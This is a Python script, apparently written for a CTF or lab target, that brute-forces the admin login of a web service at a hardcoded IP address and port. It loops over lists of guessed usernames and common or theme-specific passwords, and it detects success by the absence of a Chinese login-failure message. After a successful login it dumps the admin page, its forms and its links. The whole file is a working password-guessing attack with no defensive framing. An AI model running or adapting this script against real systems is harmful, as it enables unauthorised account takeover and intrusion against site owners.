import urllib.request, urllib.parse, http.cookiejar, re, sys

BASE = "http://103.163.47.230:33662"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]


def req(p, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=15)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    b = re.sub(r"<script.*?</script>", "", b, flags=re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b)).strip()


FAIL = "用户名或密码错误"
USERS = ["admin", "administrator", "obsidian", "root", "lab", "operator", "manager",
         "user", "obsidianadmin", "admin1", "labadmin", "photo", "archive", "curator"]
PWDS = ["admin", "admin123", "password", "123456", "obsidian", "obsidian123", "lab",
        "root", "12345678", "letmein", "welcome", "secret", "P@ssw0rd", "admin@123",
        "Admin123", "000000", "111111", "abcd1234", "pass", "test", "1234",
        "obsidian2026", "obsidian@2026", "labadmin", "imaging", "photo", "archive",
        "Obsidian", "OBSIDIAN", "obsidian!", "obsidian#1", "node", "secure",
        "control", "desk", "studio", "2026", "adminadmin", "qwerty", "1q2w3e4r"]

hit = None
for u in USERS:
    for pw in PWDS:
        cj.clear()
        s, b = req("/admin/", {"username": u, "password": pw}, "POST")
        if FAIL not in b:
            print(f"*** HIT u={u!r} pw={pw!r} s={s} len={len(b)}")
            print("   ", clean(b)[:500])
            hit = (u, pw, cj)
            break
    if hit:
        break
print("done, hit=", hit is not None)
if hit:
    # 保存会话并把后续页面 dump 出来
    s, b = req("/admin/")
    print("=== /admin/ after login ===")
    print(clean(b)[:1500])
    print("=== raw forms/links ===")
    for m in re.finditer(r"<(form|a|input|img)[^>]*>", b):
        print("   ", m.group(0)[:200])
